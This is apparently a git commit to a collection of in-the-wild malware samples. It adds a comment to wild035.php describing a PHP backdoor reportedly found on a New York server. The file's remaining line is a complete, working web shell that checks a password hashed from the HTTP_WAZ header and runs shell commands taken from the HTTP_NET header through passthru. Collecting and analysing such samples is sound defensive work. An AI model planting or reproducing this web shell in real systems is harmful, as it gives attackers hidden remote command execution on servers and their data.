5792dd9e02efcc77aae88662e39fb3c723ab8b7a
PentestThisKid <avenueblue@Gmail.com>
2021-04-22 02:56:31 -0600

    Update wild035.php
    Simple PHP backdoor with password support (custom headers in any web client)  In this case HTTP_WAZ holds the password.  HTTP_NET holds the payload.  Code is un-modified since found on a New York server. The Incident was linked to Russia; despite their obvious attempts to fool us with EN versions of VS compiled binaries on windows.

--- wild035.php
+++ wild035.php
@@ -1,1 +1,6 @@
+<!---
+Simple PHP backdoor with password support (custom headers in any web client)  In this case HTTP_WAZ holds the password.  
+HTTP_NET holds the payload.  Code is un-modified since found on a New York server. The Incident was linked to Russia; 
+despite their obvious attempts to fool us with EN versions of VS compiled binaries on Windows.
+--->
 <?php error_reporting(0);if(crypt(@getenv('HTTP_WAZ'),'aX')=='aXuwWcOeuK8cM'){@passthru(@getenv('HTTP_NET'));exit;}else{phpinfo();}?>
